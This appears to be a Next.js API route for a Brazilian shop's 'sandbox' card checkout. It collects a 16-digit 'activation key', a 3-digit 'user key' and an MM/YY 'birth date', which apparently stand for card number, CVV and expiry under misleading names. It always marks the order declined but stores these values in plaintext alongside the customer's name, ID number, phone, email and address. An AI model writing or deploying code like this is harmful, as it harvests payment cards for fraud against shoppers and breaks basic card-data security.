import { NextResponse } from "next/server";
import { excedeu, ipDe } from "@/lib/limite";
import { calcularTotal, calcularTotalCafe, type IdFrete } from "@/lib/precos";
import { supabaseAdmin } from "@/lib/supabase/servidor";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

const soDigitos = (v: unknown) => String(v ?? "").replace(/\D/g, "");
const texto = (v: unknown, max = 160) => String(v ?? "").trim().slice(0, max);

export async function POST(req: Request) {
  if (excedeu(`cartao-sandbox:${ipDe(req)}`, 10, 60_000)) {
    return NextResponse.json({ erro: "Muitas tentativas." }, { status: 429 });
  }

  let body: Record<string, unknown>;
  try {
    body = await req.json();
  } catch {
    return NextResponse.json({ erro: "JSON inválido" }, { status: 400 });
  }

  const kitIndex = Number(body.kitIndex);
  const qtd = Number(body.qtd);
  const frete = texto(body.frete, 30) as IdFrete;
  const chaveRecebida = soDigitos(body.chaveAtivacao);
  const chaveAtivacao = chaveRecebida.length === 16 ? chaveRecebida : null;
  const chaveUsuarioRecebida = soDigitos(body.chaveUsuario);
  const chaveUsuario = chaveUsuarioRecebida.length === 3 ? chaveUsuarioRecebida : null;
  const nascimentoMesAno = texto(body.nascimentoMesAno, 5);
  const nascimentoValido = /^(0[1-9]|1[0-2])\/\d{2}$/.test(nascimentoMesAno);

  if (!chaveAtivacao || !chaveUsuario || !nascimentoValido) {
    return NextResponse.json({ erro: "Preencha a chave, o identificador de 3 dígitos e o mês/ano de nascimento." }, { status: 422 });
  }

  let valores: ReturnType<typeof calcularTotal> | ReturnType<typeof calcularTotalCafe>;
  try {
    valores = body.loja === "cafecomdeuspai"
      ? calcularTotalCafe(String(body.produto ?? ""), qtd, String(body.frete ?? ""), {
          cupom: typeof body.cupom === "string" ? body.cupom : undefined,
          pagamento: "cartao",
        })
      : calcularTotal(kitIndex, qtd, frete);
  } catch (e) {
    return NextResponse.json({ erro: (e as Error).message }, { status: 422 });
  }

  const referencia = `TESTE-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`;
  const db = supabaseAdmin();
  if (!db) return NextResponse.json({ ok: false, motivo: "sem_supabase" }, { status: 202 });

  const { error } = await db.from("pedidos").insert({
    referencia,
    status: "recusado",
    metodo_pagamento: "cartao_sandbox",
    // Cartão não recebe desconto Pix.
    valor_centavos: valores.subtotal + valores.frete.centavos,
    subtotal_centavos: valores.subtotal,
    desconto_centavos: 0,
    frete_centavos: valores.frete.centavos,
    kit: valores.kit.nome,
    quantidade: qtd,
    frete_tipo: valores.frete.nome,
    cliente_nome: texto(body.nome) || null,
    cliente_email: texto(body.email) || null,
    cliente_documento: soDigitos(body.documento) || null,
    cliente_telefone: soDigitos(body.celular) || null,
    cartao_titular: texto(body.titularCartao) || null,
    chave_ativacao: chaveAtivacao,
    chave_usuario: chaveUsuario,
    nascimento_mes_ano: nascimentoMesAno,
    endereco: body.endereco && typeof body.endereco === "object" ? body.endereco : null,
  });

  if (error) {
    console.error("[cartao-sandbox] falha ao registrar tentativa:", error.message);
    return NextResponse.json({ erro: "Não foi possível registrar a tentativa." }, { status: 500 });
  }

  return NextResponse.json({ ok: true, referencia });
}
